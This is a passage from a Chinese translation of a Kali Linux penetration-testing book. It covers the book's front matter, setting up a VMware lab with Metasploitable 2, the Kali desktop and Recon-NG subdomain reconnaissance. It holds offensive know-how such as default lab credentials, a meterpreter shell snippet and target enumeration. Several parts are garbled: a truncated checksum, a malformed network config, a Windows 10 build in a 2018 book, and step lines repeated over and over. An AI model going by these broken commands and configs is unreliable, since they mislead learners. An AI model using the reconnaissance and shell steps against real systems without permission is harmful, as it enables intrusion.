# Kali Linux 基础安全测试，第三版












# 献辞

献给信息安全（InfoSec）社区的所有人士，感谢你们一直的支持与鼓励，没有你们这本书的第三版是不可能实现的！

Daniel Dieterle

> “兵法教导我们不要依靠敌人不来的胜算，而要依靠我们迎接敌人的准备；不要依靠敌人不进攻的偶然，而要依靠我们已经使自己的位置变得不可逾越。” ——孙子

> “看哪，我把你们像羊送入狼中，所以要像蛇机敏，像鸽子单纯。” —— 马太福音 10:16 (和合本版)

# 关于作者

Daniel W. Dieterle 在 IT 领域工作了 20 多年。在此期间，他在一家计算机支持公司工作，为纽约州北部和整个宾夕法尼亚州的数百家公司提供系统和网络支持。他还曾在一家财富五百强企业的数据中心工作，短暂在常春藤盟学校的计算机支持部门工作，并在一家电气公司担任过主管。

在过去的 8 年里，Daniel 作为计算机安全研究人员和作者完全专注于安全领域。他的文章发表在国际安全杂志上，并被技术实体和媒体引用。Daniel 协助过许多安全培训课程和技术书籍的编写，主要基于道德黑客术和 Kali Linux，并乐于帮助该领域的新手。

Daniel W. Dieterle

**邮箱：** cyberarms@live.com
**网站：** cyberarms.wordpress.com
**Twitter：** @cyberarms

# 关于评审者

特别感谢本书的评审者，你们的时间、洞察和投入我们不胜感激。

Bill Marcy（第 1-3 版）—— 同行及朋友。

Tim Finholm（第 2 版）—— 拥有夏夷太平洋大学计算机科学学士学位，持有多种证书，包括认证道德黑客（CEH）和 Security+。他于 2013 年底从美国陆退役，目前在马里兰大学巴尔的摩县培训中心教授信息技术侧重点课程。

Timothy James Asher（第 2 版）—— 安全研究员、CTF 玩家及博客作者。










- Sparta



- 选择有效负载 (Payload)
- 永恒之蓝


- 运行脚本



Metasploitable - 第二部分：扫描器







- 使用 Veil
- 获取远程 Shell







- 在 Metasploit 中进行远程数据包捕捉









+ 有效负载和监听







+ 使用 PSRec
+ wine 的实际操作





+ 使用更大的字典文件


+ 使用 Hydra 自动化密码攻击


Mimikatz 和 Utilman
从锁定的工作站恢复密码

Keyscan、Lockout Keylogger 和步骤录制
路由器 & WiFi 安全测试
# 第 24 章
无线安全协议
Routerpn
将无线卡转换为接入点

使用 WiFi 进行 WiFi 测试










## 在 Wireshark 中分析 PCAP Beacon 帧









补丁与更新
防火墙与 IPS
防病毒/网络安全程序

限制服务与权限级别
网络安全监控



## 什么是 Kali Linux？

Kali Linux 是一个基于 Linux 的高级安全测试平台。Kali 从零开始编写，旨在成为功能最丰富的道德黑客/渗透测试发行版。Kali 还可以运行在更多硬件设备上，极大增加了你进行计算机安全渗透测试或道德黑客攻击的选择。

如果你是从 Backtrack 背景转到 Kali，经过简短的适应期，你会发现一切都非常相似，你的熟悉程度会迅速提高。如果你是 Kali 的新手，一旦习惯了它，你将会发现一个易用的安全测试平台，它包含了数百种有用且强大的工具，用于测试并帮助保护你的网络系统。


Kali 包含了超过 300 种安全工具。Backtrack 中的许多冗余工具已被移除，工具界面也经过了简化。你现在可以通过易用的“应用程序”菜单快速找到最常用的工具。你还可以在菜单系统中找到这些工具以及大量其他工具，它们都经过了整齐的分类。

Kali 允许你使用与黑客相似的工具和技术来测试你网络的安全性，这样你可以在真正的黑客发现这些问题之前发现并修复它们。


黑客在攻击网络时通常会组合多个步骤。这些步骤总结如下：

- 侦察 (Recon) - 使用多个源检查目标——如情报收集。
- 扫描 (Scanning) - 绘制发现的网络映射并对其进行调查。
-  利用 (Exploitation) - 攻击扫描过程中发现的主机。
- 权限提升 (Elevation of Privileges) - 将低权限账户提升为 Root 或系统级权限。
- 维持访问 (Maintaining Access) - 使用后门等技术保持对网络的访问。
- 掩盖踪迹 (Covering their Tracks) - 擦除日志并操纵文件以隐藏入侵行为。

道德黑客或渗透测试员（受雇在攻击者发现之前寻找漏洞的“好人”）会模拟许多此类技术，并使用公司管理层设置的参数和准则。

然后我们将他们的发现报告给管理层，并协助纠正问题。

我们不会详述过程中的每一个步骤，但会向你展示许多所使用的技术，以及如何防御它们。

我认为使用 Kali 而不是商业安全解决方案的首要动力是价格。安全测试工具可能极其昂贵，而 Kali 是免费的！Kali 包含了许多商业安全产品的开源版本，因此理论上你可以简单地通过使用 Kali 来替代那些昂贵的程序。尽管 Kali 确实包含了几个流行软件的免费版本，这些版本可以升级为完整付费版并通过 Kali 直接使用。

在 Backtrack 中，更新某些程序似乎会破坏其他程序；而在 Kali 中，你使用 `kali update` 命令更新所有内容，这能更好地保持系统完整性。只需更新 Kali，它就会下载所包含工具的最新版本。只需提醒你一点，单独更新工具可能会破坏 Kali，因此运行 Kali 始终是获取操作系统最新包的最好方法。不过，某些工具作者选择直接从 GitHub 进行更新/安装克隆版本，而不是使用 Kali 的安装过程。

除了 Kali 的独立实例和虚拟机实例外，我还在树莓派（Raspberry Pi）上使用 Kali —— 这是一种只有信用卡大小、基于 ARM 架构的计算机。有了 Kali，你可以在树莓派上几乎完成你在全尺寸系统上能做的事情。在本书中，我将介绍树莓派作为一个安全测试平台，包括对无线网络的测试。我还简要介绍了 Kali NetHunter，这是一个基于 Android 的 Kali 测试平台。用一个可以放进口袋的设备测试网络，那有多酷酷吗？

虽然 Kali 不可能包含每个个人偏好的所有安全工具，但它包含的内容已足够 Kali 从头到尾用于安全工具链。不要忘记 Kali 不仅仅是一个安全工具，更是一个功能完 Linux 操作系统。所以，如果你喜欢的工具在 Linux 下运行但未被包含，你很可能可以在 Kali 中安装并运行它。


在道德黑客与渗透测试中，安全测试员基本上表现得像黑客。他们使用黑客最可能使用的工具和技术来测试目标网络的安全性。区别在于，他们受公司雇用进行安全性测试，并向领导团队展示他们是如何进入的以及可以做什么来堵漏洞。

我在这些技术中看到的最大问题是伦理和法律。使用 Kali 及其内置工具可以执行的某些安全技术在某些地区实际上是非法的。因此，用户在使用 Kali Linux 中的工具之前，检查当地、州法律和联邦法律是非常重要的。

此外，你可能会遇到一些用户尝试在他们没有权限的网络上使用 Kali 这一套非常强大的工具。或者，他们会尝试在生产网络上使用他们学过但可能尚未精通的技术。这些都是潜在的法律和伦理问题。永远不要在没有书面许可的情况下对系统运行安全工具。此外，最好运行可能修改数据或可能导致系统不稳定的测试。
# 本书范围

本书侧重于对 Backtrack/Kali 具有入门到中级经验的人士，对于想要进入该领域的非安全 IT 专业人员来说也是很好的工具。我们将涵盖从 Kali 基础概述到使用工具对 Windows 和 Linux 系统进行安全测试的内容。我们将涵盖从社会工程、在树莓派上使用 Kali、破解密码以及保护你的系统。


本书是那些在大学、培训中心、教室和全球安全中心使用的书籍的最新修订。能够为如此受接受和采用的书提供更新是巨大的荣幸。我写这本书的另一个原因是帮助对计算机安全领域感兴趣的年轻人。例如，美国在选择技术职业方面正面临危机，网络安全领域也不例外。美国政府需要数千^1 网络战士，一些行业专家甚至建议美国考虑从国外招聘安全专家^2 来填充空白。


在没有书面许可的情况下，切勿尝试访问计算机。这样做可能会让你面临法律起诉，并可能入狱。

> 本书中的信息仅供教育目的。

在真实环境中，你可能会遇到许多材料中未涵盖的问题和技术。本书仅演示了 Kali 中一些基础的工具用法，不应被视为道德黑客或渗透测试的全方位材料。

我没有创建 Kali 中的任何工具，我也不是 Kali Linux 或 Offensive Security 的代表。书中任何错误、疏忽或教程错误均为本人所有，不反映工具作者。工具的安装、使用和更新程序随时间变化，如果此处提供的安装/设置信息失效，请检查工具网站获取最新信息。虽然没有提到名字，但感谢 Kali 开发者创造了如此不起的作品，也感谢所有的工具作者，他们的工作非常出色，并帮助了全球系统的安全！


+ 1. https://www.csmonitor.com/USA/Military/2011/0509/What-US-cybersecurity-needs-a-few-more-good-guys
+ 2. https://www.theguardian.com/technology/2012/jul/10/us-master-hackers-al-qaida





安装虚拟机

在本章中，我们将学习在宿主机电脑上使用 VMware Player 将 Kali Linux、Windows 7 和 Metasploitable 2 设置为虚拟机（VM）。使用虚拟机搭建我们的测试实验室，这使得使用 Kali 学习如何进行攻性安全测试变得非常简单。虚拟机使得在单台电脑上运行多个操作系统成为可能。这样，我们就不需要一满房间的电脑来搭建测试和学习环境。我们只需要一台性能足够强大的同时运行几台虚拟机的机器。

书中所有的实验都是使用一台配备 8 GB 内存的 Windows 7 Core i7-6700 系统作为虚拟机宿主机完成的。它有足够的性能来同时运行我们的三个实验室操作系统，且完全没有问题。虽然 64 位版本也应该运行良好，但在安装 Kali Linux 时我选择了 32 位版本，因为 Kali 中安装的某些工具只能在 32 位系统上运行。如果你有虚拟系统的经验，可以使用任何你喜欢的虚拟机软件。但对于这本书，我将使用 VMware Player 作为宿主机软件，然后在宿主机运行的独立虚拟机中安装 Kali、Metasploitable 2 和 Windows 7。

完成后，我们应该拥有一个类似于这样的小型测试网络：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_25_0.png)

由于我们将处理有漏洞的操作系统，请确保在宿主机系统和实时互联网之间有一个防火墙路由器（优选硬件防火墙）。


在 VMware 上安装 Kali 非常简单，因为 Offensive Security 提供了一个可以直接下载的 Kali 镜像，所以我们不会在上面花费太多时间。

下载并安装适用于你操作系统版本的 VMware Player。

- 1. 下载并安装 VMware Player

VMware Player 的版本甚至下载位置似乎经常发生变化。在编写本书时，VMware Player 的当前版本是“VMware Workstation 14 Player”，它可以作为非商业用途的免费播放器运行，也可以通过许可证运行。（https://www.vmware.com/go/tryplayer）


![](img/37a3b7ef116f9ef991f9e33dd8b348c7_26_0.png)

- 2. 选择你想要安装的位置，通常默认设置即可。

- 3. 按照安装提示操作，在需要时重启电脑。

- 4. 启动 VMware，为免费版本输入你的电子邮件，或为商业用途购买并输入许可证密钥：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_26_1.png)

- 5. 点击“继续”，完成后点击“完成”。

- 6. 下载 Kali Linux 32 位虚拟机镜像 (https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-hyperv-image-download/)。

验证下载的校验和 始终是一个好主意，以验证文件是否正确且没有被修改或损坏。你可以使用 `certUtil` 命令执行此操作：

- 7. 从命令提示符输入 `certUtil -hashfile [kali linux 下载文件] SHA256`

```
C:\Users\Dan\Downloads\certUtil -hashfile kali-linux-2018.2-vm-1386.zip SHA256
sha256 hash of kali-linux-2018.2-vm-1386.zip:
73a9b8de8aba54ba6c07261528700e104ed46cfce32ca18c4056219fd765a7
certUtil:-hashfile command completed successfully.
```

然后只需与 Kali 下载页面列出的校验和进行对比即可。

- 1. 接下来，将文件解压到你想运行它的位置（我使用了 c:\BasicVMs）；
- 2. 启动 VMware Player。
- 3. 点击菜单中的“播放”。
- 4. 然后“文件”。
- 5. 接下来点击“打开”。
- 6. 导航到提取出的 Kali Linux .vmx 文件，选中它并点击“打开”。
- 7. 它现在将出现在 VMware Player 主界面上。
- 8. 选中虚拟机后点击“编辑虚拟机设置”。
- 9. 在这里你可以查看并更改虚拟机的任何设置：

| 设备 | 摘要 |
| --- | --- |
| 内存 | 2 GB |
| 处理器 | 4 |
| 硬盘 (SCSI) | 80 GB |
| CD/DVD (IDE) | 自动检测 |
| 网络适配器 | NAT |
| USB 控制器 | 已存在 |
| 声卡 | 自动检测 |
| 显示 | 自动检测 |

- 17. “网络适配器”：默认设置。NAT 意味着每个（网络地址转换）虚拟机将在一个小小的 NAT 网络中创建，该网络在宿主机之间共享；如果需要，它们也可以访问互联网。有些人人报告过使用 NAT 遇到问题，只有桥接（Bridged）模式正常，因此在书中我对你所有的虚拟机都使用了桥接模式。如果你确实使用桥接模式，请确保你的系统和互联网之间有一个硬件防火墙。

- 18. 点击“确定”。

- 19. 在虚拟机高亮状态下点击“确定”，回到主界面。

- 20. 启动 Kali。

- 21. 虚拟机启动后将显示登录界面。

- 22. 使用 Kali Linux 32 位 虚拟机镜像。

- 23. 虚拟机启动后将显示桌面。

- 24. 使用默认用户，登录 Kali Linux 镜像。

- 25. 使用默认用户，登录 Kali Linux。

- 26. 虚拟机启动后将显示桌面。

- 27. 虚拟机启动后将显示桌面。

- 28. 虚拟机启动后将显示桌面。

- 29. 虚拟机启动后将显示桌面。

- 30. 虚拟机启动后将显示桌面。





Metasploitable 2 是一个故意留漏洞的 Linux 操作系统，我们将对其进行利用练习，它也可以 VMWare 虚拟机的形式提供。正如我们在上面的 Kali VM中所做的，我们只需要下载 Metasploitable 2 虚拟机镜像，解压并用 VMware Player 打开它。

- 1. 下载 Metasploitable 2
(http://sourceforge.net/projects/metasploitable/files/Metasploitable2/)

- 2. 解压并将其放在你选择的文件夹中（我使用了 C:\Kali BasicVMs）：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_32_0.png)

然后通过启动另一个 VMware Player 在 VMware 中打开 Metasploitable 2。

点击“Player（播放）”、“File（文件）”、“Open（打开）”。

导航到 'Metasploitable.vmx' 文件，选择它并点击“Open（打开）”。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_32_1.png)

它将出现在 VMware Player 菜单中。

- 3. 现在进入 Metasploitable 的“Edit Virtual Machine Settings（编辑虚拟机设置）”，确保网络接口设置为“Bridged（桥接）”（如果你愿意，也可以设置为 NAT，只需确保所有虚拟机都设置为相同的）。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_32_2.png)

Metasploitable 2 现在已就绪。

## **警告：**

Metasploitable 是一个故意留漏洞的操作系统。千万不要直接在互联网上开放运行它。确保你的宿主机系统和互联网之间安装了防火墙。

继续启动 Metasploitable 系统，如果询问你是移动还是复制了它，点击“I copied it（我复制了它）”。你现在应该看到 Metasploitable 桌面：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_33_0.png)

```
Warning: Never expose this VM to an untrusted network!
Contact: msfdeviatmetasploit.com
Login with msfadin/msfadin to get started
metasploitable login:
```

- 4. 使用屏幕上的凭据登录。
  用户名：**msfadin**
  密码：**msfadin**

要退出此虚拟机窗口并恢复鼠标控制权


默认情况下，Metasploitable 2 的地址设置为“Dynamic（动态）”。要将其设置为静态 IP，请编辑“/etc/network/interfaces”文件并手动设置 IP 地址、子网掩码和网关（这些数字在你的网络中可能不同）。我使用的 IP 地址是 192.168.1.68。

在 Metasploitable2 中进入“/etc/network”
输入“**sudo nano interfaces**”
将 iface eth0 inet static 行改为 dynamic
然后输入 IP 地址、子网掩码和你的路由器网关，如下所示：

## GNU nano 2.0.7 File: interfaces

```
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

# The loopback network interface
auto lo
iface lo loopback

# The primary network interface
auto eth0
iface eth0 static	address 192.168.1.68	netmask 255.255.255.0	gateway 192.168.1.1
```

完成后，按下“ctrl-x”、“y”，然后按“回车键”
输入“cat interfaces”来验证你的更改：

```
msfadnimmetasplooiable:/etc/network# cat interfaces
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

# The loopback network interface
auto lo
iface lo loopback

# The primary network interface
auto eth0
iface eth0 static	address 192.168.1.68	netmask 255.255.255.0	gateway 192.168.1.1
```

输入“sudo reboot”来重启 Metasploitable2
我们现在已经设置好 Metasploitable2 和 Kali 系统并准备就绪使用。
使用 ping 命令验证 Kali 和 Metasploitable2 是否可以互相看到。
在 Kali 终端中，ping Metasploitable2：

```
root@kali:~# ping 192.168.1.68
PING 192.168.1.68 (192.168.1.68) 56(84) bytes of data.
64 bytes from 192.168.1.68: icmp_seq=1 ttl=64 time=9.48 ms
64 bytes from 192.168.1.68: icmp_seq=2 ttl=64 time=0.792 ms
64 bytes from 192.168.1.68: icmp_seq=3 ttl=64 time=0.860 ms
```

在 Metasploitable2 中，ping Kali 虚拟机：

```
msfadnimmetasploitable:ping 192.168.1.39
PING 192.168.1.39 (192.168.1.39) 56(84) bytes of data.
64 bytes from 192.168.1.39: icmp_seq=1 ttl=64 time=0.411 ms
64 bytes from 192.168.1.39: icmp_seq=2 ttl=64 time=0.821 ms
64 bytes from 192.168.1.39: icmp_seq=3 ttl=64 time=0.830 ms
```

如果在两个响应中都看到了“64 bytes from ...”，就可以确定一切都已设置，它们可以互相看到并通信。


在本节中，Metasploitable 2 的地址设置为“Dynamic（动态）”。要将其设置为静态 IP，请编辑“/etc/network/interfaces”文件并手动设置 IP 地址、子网掩码和网关（这些数字在你的网络中可能不同）。我使用的 IP 地址是 192.168.1.68。





不要在生产系统上使用新技术或未经测试的工具。在上线系统中使用它们之前，你应该始终准确了解这些工具的作用，以及如何撤销这些工具所做的任何更改。许多大型企业实际上会拥有一个生产系统的完全副本，用于测试，在尝试任何可能更改或负面影响上线系统的操作之前进行测试。

在下一章中，我们将查看 Kali 桌面及其菜单系统。菜单系统仅包含了一些最常用的程序。Kali 中包含的许多程序不在菜单系统中，而是直接从终端提示符访问。还有许多为 Kali Linux 编写的工具并未预装，我们将在随后的章节中进行介绍这些工具。


- VMware - https://www.vmware.com/
- Kali 安装指南 - https://docs.kali.org/category/installation
- Kali VMware 下载 - https://www.offensive-security.com/kali-linux-vm-vm-vm-vmware-virtualbox-hyperv-image-download/
- Microsoft VM 下载 - https://dev.windows.com/en-us/microsoft-edge/tools/vms/


## Kali Linux 简介

Kali Linux "Rolling"（滚动版）是目前为止所有 Backtrack/Kali 版本中最易用的一个。最新版本在外观上与之前的版本变化很小，但底层发生了一些变化。如果你已经有一段时间没有使用 Kali Linux 了，菜单已经完全重新组织并精简，许多工具都用实用的图标表示出来。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_39_0.png)


Kali 2017 & 2018 更新带来了：

- 支持 RTL8812AU 无线网卡注入
- 精简的 CUDA GPU 破解支持
- 合并了 Mettego & Casefile
- 新旧及更新的工具

此外，还有一个更新的内核，包括：

- 支持 AMD 安全内存加密
- 增加的内存限制

与早版本的 Kali/Backtrack 相比，Kali Rolling 更加精简，布局非常非常顺畅。感觉一切都在你的指尖上，并以非常清晰简洁的方式列出。让我们来看看桌面及其功能。


桌面看起来非常漂亮，并将一切置于你的指尖上：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_40_0.png)


Kali 最好的新增功能之一是位于桌面左侧可自定义的“收藏栏”。此菜单列出了最常用的应用程序，帮助你更快进入战斗状态：

| Firefox | 浏览器浏览器 |
| --- | --- |
| Terminal | 打开终端提示符 |
| File Manager | 文件管理器 |
| Metasploit | 启动 Metasploit 框架 |
| Armitage | Metasploit GUI 攻击界面 |
| Burp Suite | Burp Suite 应用程序测试 |
| Maltego | Maltego 情报与取证应用 |
| Beef | 浏览器利用框架 |
| Faraday IDE | Faraday 集成测试环境 |
| Leafpad | 文本编辑器 |
| Tweaks | 更改 Kali 的外观和设置 |
| Show Applications | 显示应用程序菜单 |

只需点击其中一个，相应的工具就会带有所需的依赖自动启动。例如，点击 Metasploit 按钮会预启动数据库软件，并在启动 Metasploit 之前检查默认数据库是否已创建。

点击收藏栏底部的“Show Applications”（显示应用程序）按钮会显示更多应用程序。程序按类型在文件夹中。你可以从“Frequent”（常用）或“All”（全部）中进行选择：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_41_0.png)

如果你没有看到想要的程序，只需在搜索栏中输入你要查找的内容。


按类别列出的常用程序收藏列表位于应用程序菜单下：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_42_0.png)

花时间检查每个主菜单项。工具按类型逻辑化布局。例如，点击“Web Application Analysis”（Web 应用分析）菜单项查看最常见的 Web 应用测试工具：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_42_1.png)

我并没有说特定类别的“所有”工具都会被列出。这是因为菜单系统显示的是顶级工具，而不是 Kali 中提供的所有工具。实际上，Kali 中安装的工具只有一小部分实际上在菜单系统中。大多数工具只能从命令行访问。


所有工具都可以从终端提示符可用，你可以通过查看 `/usr/share` 目录看到大部分已安装的工具：

```
root@kali:~# cd /usr/share
root@kali:/usr/share# ls
actool
adduser
adium
aqfln
alsa
art
antler
apache2
apktool
application-registry
applications
apport
apt-listchanges
armitage
arp-scan
arpwatch
automater
autopsy
libgsu
libnomekd
libghost2
libgeyser
liblouis
libwu
libnmas
libosinfo
libqui-scripts
libsensors4
libthai
libwacom
libintian
lvs-2.5
locale
lua
luajit-2.0.4
lynx
sasmchanger
magicrescue
magictree
```

这些工具与所有菜单工具一样，只需在终端中输入它们的名称即可运行。花几分钟熟悉菜单系统和 share 目录。


Kali 最新版本中的另一个新变化是某些窗口往往会自动最小化并在有时看起来会消失。当窗口最小化时，你会在收藏栏上相关图标的左侧看到一个白圈。在下面的截图中，显示我有两个最小化的终端：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_43_0.png)

如果我点击一次终端图标，第一个终端窗口将出现；点击两次，两个最小化的终端窗口都会出现：

```
root@kali: ~~
meterpreter > getuid
server username:
meterpreter > shell
Process 6172 created.
Channel 1 established on Microsoft Windows [Version 10.0.19044]
(2015) Microsoft Corporation. All rights reserved.
Ar
C:\Users\Dan-dir>
Volume in drive C has no label.
Volume Serial Number is FAD8-4144
```

你也可以使用“Alt-Tab”显示最小化窗口。按住“Alt”键并来回查看其他窗口。


与早版本的 Kali/Backtrack 一样，你也有工作空间。如果你不熟悉工作空间，它们基本上是你可以使用的额外桌面。按住“Super Key”（Windows 键）可以让你查看已打开窗口概。如果你有触摸屏显示器，还可以抓取并拉工作空间菜单。通过工作空间，你可以在工作空间之间拖放运行中的程序：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_44_0.png)


位置菜单包含指向 Kali 不同位置的链接。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_45_0.png)


Kali 2 内置了投屏功能。通过此功能，你可以记录下发生时的安全冒险！

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_45_1.png)


对于熟悉 Kali 早期版本的人，启动和停止 Apache 的菜单选项已不再存在。你可以从终端提示符使用以下命令控制它：

- 启动——"service apache2 start"
- 停止——"service apache2 stop"
- 重启——"service apache2 restart"

```
root@kali:~# service apache2 stop
root@kali:~# service apache2 start
```

或者你也可以使用

```
systemctl status apache2
systemctl start apache2
systemctl stop apache2
```

一旦启动服务器，就可以访问 Kali 的服务器，注意默认网页已与早期 Kali 版本有所变化：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_46_0.png)

根网站也深了一层，位于名为“html”的文件夹中：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_46_1.png)

因此，当你使用 Apache 服务器时，只需将你的网站页面/文件夹放入 "/var/www/html/" 目录，而不是旧的 "/var/www/" 目录。





你在列表中首先想要执行的操作之一是关闭 5 分钟时间限制的屏锁功能。相信我；久了之后这会让你抓狂的。

1. 点击快速启动栏中的“显示应用程序”按钮。
2. 在出现的搜索栏中输入“power”。
3. 点击“电源（Power）”图标。
4. 然后在“空白（Blank Screen）”列表中选择“从不（never）”或你喜欢的任何时间限制。

![](img/37a3b7ef116f9ef9)


在本章中，我们快速涵盖了 Kali 的新功能和变化。菜单的变化使得查找和使用工具比之前的版本要方便得多。如果你不熟悉 Kali，学习的最佳方法是花时间到处观察并使用该系统。我认为你一定会非常喜欢它的，特别是如果你是从 BackTrack 或原始 Kali 版本迁移过来的话。

接下来，我们将跳转到使用 Kali 自带的工具来执行信息收集。这通常是划定目标范围的第一步。


- Kali Linux 2017.1 版本发布 - https://www.kali.org/news/kali-linux-2017.1-release/
- Kali Linux 2017.2 版本发布 - https://www.kali.org/news/kali-linux-2017-2-release/
- Kali Linux 2017.3 版本发布 - https://www.kali.org/releases/kali-linux-2017-3-release/
- Kali Linux 2018.1 版本发布 - https://www.kali.org/news/kali-linux-2018-1-release/
- Kali Linux 2018.2 版本发布 - https://www.kali.org/news/kali-linux-2018-2-release/


渗透测试人员和黑客执行的第一个步骤都是信息收集。他们希望尽可能多地了解目标，以使任务变得更容易进行。所以，让我们从查看工具开始这段旅程吧。Kali 中有很多工具可以辅助信息收集。Maltego 是一个非常流行的工具，在安全书籍中有很大量的介绍。由于它已经有了很多介绍，我们将查看 Kali 中包含的其他工具。在本章中，我们将仔细研究“Recon-NG”，在下一章中我们将介绍“Shodan”。


**工具作者：** Tom Marshall
**工具网站：** bitbucket.org/TomMarshall/recon-ng
**工具使用指南：** https://bitbucket.org/TomMarshall/recon-ng/wiki/Usage

Recon-NG 框架是一个强大的工具，允许你执行自动化信息收集和网络侦察。Recon-NG 自动化了初始渗透测试中采取许多步骤。你可以自动访问许多网站以收集有关目标的被动信息，甚至探测目标本身。它拥有许多功能，允许你收集用于社会工程攻击的用户信息，以及用于映射等更多功能的网络模块。

将 Recon-NG 视为信息收集领域的 Metasploit。基本上，你可以使用 Recon-NG 收集目标信息，然后开始攻击。任何熟悉 Metasploit 的人都会感到亲切，因为其界面的设计具有相似的外观和感受。命令用法和流程也非常相似。


你可以通过从“应用程序 > 信息收集”菜单中选择来启动 Recon-NG，或者通过命令行：

点击快速启动栏上的“终端（Terminal）”图标打开终端窗口。
输入 `recon-ng`：


你可以使用标准的数据库命令（如 `Select * from [table]` 等）直接与数据库进行交互，但对于新用户来说，直接使用 `show` 命令要简单得多。


"workspaces" 命令允许你通过为侦测会话创建独立的数据库来保持工作隔离。你可以创建多个数据库，然后使用 `all workspaces` 命令在它们之间进行切换：

```
recon-ng [default] > workspaces
管理工作空间
用法: workspaces [list|add|select|delete]
```

例如，让我们创建一个名为 "test" 的工作空间：

输入 "workspaces add test"

```
recon-ng[default] > workspaces
recon-ng[default] > |
```

在当前版本中，你将看到许多关于密钥未设置的红色警告——这仅意味着尚未为特定的 Web API 输入 API 密钥，目前不可用，或者以后可用。注意，工作空间已创建，并根据提示符的变化自动设置为使用显示的 "test" 数据库。现在运行 recon 模块时恢复的任何数据都将存储在 "test" 数据库中。我们可以随时使用 `workspaces select` 命令跳转到另一个工作空间。

例如，让我们回到 "default" 工作空间：

输入 [test] workspaces select default

```
recon-ng [test] > workspaces select default
recon-ng[default] > |
```

我们现在已回到了默认工作空间。现在运行模块恢复的数据将存储在默认工作空间数据库中。好了，概述到此为止；让我们来看看 Recon-NG 的实际情况。从使用 Netcraft 搜索模块检测主机名开始。

## 使用 Netcraft 检测主机名

主动探测网络结构的一种策略是使用搜索引擎列举站点域名。你知道会有一个像 `some_target_name.com` 这样的主域名，但还有哪些子域名呢？你可以使用 Google 使用 "site:" 和 "inurl:" 切换搜索子域名。然后移除你找到的子域名 (-inurl)，以便其他子域名出现。如果目标有大量的子域名，手动操作将花费很长时间，并且需要输入大量内容。Recon-NG 将自动完成此操作并将其发现的内容记录在数据库中。你也可以使用如 Netcraft 等网站工具服务来发现这些信息。

让我们使用 Netcraft 搜索模块尝试一下：

切换到 "test" 工作空间，输入 "workspaces select test"
输入 "use recon/domains-hosts/netcraft"
然后输入 "show options" 查看该模块的要求：

```
[recon-ng][test] > recon/domains-hosts/netcraft
[recon-ng][netcraft] > show options
```

| 名称 | 当前值 | 是否需要 | 描述 |
|---|---|---|---|
| SOURCE | default | yes | 输入源（参见 'show info'） |
| [recon-ng][test][netcraft] | | | |

遵循 Recon-NG 模块布局，该模块将域名转换为主机 (domains-hosts)。我们只需要通过设置 `SOURCE` 变量提供目标域名。

只需输入 "set SOURCE [Target Website]"
然后输入 "run"，

```
[recon-ng][test][netcraft] > set SOURCE cyberarms.wordpress.com
SOURCE => cyberarms.wordpress.com
[recon-ng][netcraft] > run
```

该模块将连接到 Netcraft 并查询任何主机子域名。如果我们在下面的虚构示例中使用网站名称 `cyberarms.wordpress.com`。作为一个 WordPress 托管的站点，Netcraft 中没有记录子域名。如果有一个带有子域名的网站，你会看到如下返回：

- * URL: http://searchdns.netcraft.com/?'host': cyberarms.wordpress.com'
- [host] cyberarms.wordpress.com
- [host] secret.cyberarms.wordpress.com
- [host] store.cyberarms.wordpress.com
- 等待以避免锁定...
- * URL: http://searchdns.netcraft.com/?'host': cyberarms.wordpress.com'
- [host] developers.cyberarms.wordpress.com
- [host] secure.cyberarms.wordpress.com
- [host] cloud.cyberarms.wordpress.com
- 等待以避免锁定...

如你上面的文本所示，Recon-NG 正在使用 Netcraft 寻找可用子域名。几秒钟内，就列出了几个站点。这些信息通过手动方法枚举将花费很长时间。

完成后，输入 “show hosts” 显示所有发现的主机。这些将记录在数据库的 'Hosts' 表中。你还可以创建一个报告来查看收集的数据。

只需输入 “back” 退出当前模块
然后再次 “show modules”
注意 “Reporting” 部分：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_55_0.png)

只需使用这些模块之一即可对你获得的数据自动创建一个精美的报告。例如，将恢复的数据转换为逗号分隔 (csv) 文件：

输入 “use reporting/csv" 
然后输入 “run”：

```
[recon-ng][test] > use reporting/csv
[recon-ng][test] > run
```

之后，数据将保存在 CSV 文件中。你可以在输出目录找到此文件。要查看数据，你可以导航到目录并使用 `cat` 命令。

```
root@kali:~ cd /root/.recon-ng/workspaces/test
ls
```

之后，你将在 CSV 文件中看到数据。你还可以以 HTML 格式查看数据。要执行此操作，你可以使用 reporting/html 模块并显示选项：

```
[recon-ng][test] > use reporting/html
[recon-ng][test] > show options
```

| 名称 | 当前值 | 是否需要 |
|---|---|---|
| CREATOR | | yes |
| CUSTOMER | | yes |
| FILENAME | | yes |
| SANITIZE | | yes |

我们需要在生成报告运行之前设置“Creator”和“Customer”选项。

最后，使用浏览器访问文件并查看报告：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_56_0.png)

我们可以从这个虚构报告中看到发现了206 个主机。点击 Hosts 旁的 [+] 可以查看主机。

## 添加 API 密钥

为了使用 Shodan、YouTube 和 Twitter 等服务进行更高级的搜索，你需要从相应的服务获取 API 密钥。

> **警告：**

使用 Recon-NG 扫描用户信息可能会违反某些公司的开发者 API 策略。在继续之前仔细阅读。

获取 API 密钥的过程对于每个服务不同。有关获取这些密钥的说明，请参见 Recon-NG 用户指南网页：

https://bitbucket.org/LaNMasteR53/recon-ng/wiki/Usage%20Guide#acquiring-api-keys

由于某些 API 策略不再允许使用其服务扫描用户信息，我将不会涵盖这些模块。但基本上，一旦获取了 API 密钥，只需要在程序中设置。这是通过 **keys** 命令完成的：

输入 **keys help**:

```
recon-ng [default] > keys help
管理框架 API 密钥
